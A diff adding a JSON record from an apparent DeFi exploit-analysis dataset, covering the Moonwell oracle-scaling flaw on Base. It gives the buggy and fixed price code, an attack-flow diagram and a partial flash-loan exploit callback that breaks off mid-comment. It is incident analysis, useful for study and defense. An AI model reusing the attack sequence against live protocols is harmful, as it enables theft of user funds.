@@ -1,0 +1,31 @@
+{
+ "id": "2025__2025-11-20_Moonwell_OracleManipulation-Chainlink",
+ "source_file": "2025/2025-11-20_Moonwell_OracleManipulation-Chainlink.md",
+ "title": "Moonwell — Chainlink Oracle Manipulation Analysis",
+ "date": "2025-11-20",
+ "protocol": "Moonwell",
+ "chain": "Base",
+ "loss_raw": "~1,000,000 USD",
+ "loss_usd": null,
+ "root_cause": "Scaling calculation error in wstETH/rsETH price oracle leading to overvaluation of collateral",
+ "attack_tx": "0x190a491c...",
+ "vulnerable_contract": "Moonwell Lending Market (Base)",
+ "classes": [
+  "oracle-price-manipulation"
+ ],
+ "code_before": [
+  "❌ Vulnerable pattern: Oracle price scaling calculation error\nfunction getUnderlyingPrice(address cToken) external view returns (uint256) {\n    // Scaling factor is incorrectly applied when computing wstETH price\n    // e.g., decimal mismatch in wstETH/ETH ratio * ETH/USD price\n    uint256 wstEthToEth = getWstEthRate();  // 1e18 denomination\n    uint256 ethToUsd = chainlinkEthUsd.latestAnswer();  // 1e8 denomination\n    //",
+  "❌ Multiplying the two values directly causes decimal overflow\n    return wstEthToEth * ethToUsd; // 1e26 → value far larger than actual\n}\n\n//"
+ ],
+ "code_after": [
+  "✅ Fix: Correct decimal normalization\nfunction getUnderlyingPrice(address cToken) external view returns (uint256) {\n    uint256 wstEthToEth = getWstEthRate();    // 1e18 denomination\n    uint256 ethToUsd = chainlinkEthUsd.latestAnswer(); // 1e8 denomination\n    // Correct scaling: normalize result to 1e18\n    return wstEthToEth * ethToUsd / 1e8;\n}"
+ ],
+ "steps": [
+  "wstETH mint → receive mwstETH",
+  "wrsETH mint → receive mwrsETH"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─[1]─▶ Flash loan from Velodrome CL Pool\n  │         └─ Borrow large amount of wstETH + wrsETH\n  │\n  ├─[2]─▶ Deposit collateral into Moonwell market\n  │         wstETH mint → receive mwstETH\n  │         wrsETH mint → receive mwrsETH\n  │\n  ├─[3]─▶ Comptroller.enterMarkets([mwstETH, mwrsETH])\n  │         └─ Register as collateral\n  │\n  ├─[4]─▶ Over-borrow based on oracle overvaluation\n  │         Borrow far more USDC/ETH than actual collateral value\n  │\n  ├─[5]─▶ Repay flash loan\n  │\n  └─[6]─▶ Retain ~1,000,000 USD profit\n              (borrowed amount - actual collateral value)",
+  "function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {\n    require(msg.sender == address(clPoolWstEthWrsEth), \"invalid flash caller\");\n\n    // [1] Deposit borrowed wstETH into Moonwell\n    IERC20(wstETH).approve(address(mWstETH), type(uint256).max);\n    ICErc20(mWstETH).mint(wstETHBalance);\n\n    // [2] Deposit borrowed wrsETH into Moonwell\n    IERC20(wrsETH).approve(address(mWrsETH), type(uint256).max);\n    ICErc20(mWrsETH).mint(wrsETHBalance);\n\n    // [3] Register as collateral in the market\n    address[] memory cTokens = new address[](2);\n    cTokens[0] = address(mWstETH);\n    cTokens[1] = address(mWrsETH);\n    IComptroller(comptroller).enterMarkets(cTokens);\n\n    // [4] Over-borrow USDC based on oracle overvaluation\n    // Can borrow far more USDC th"
+ ]
+}
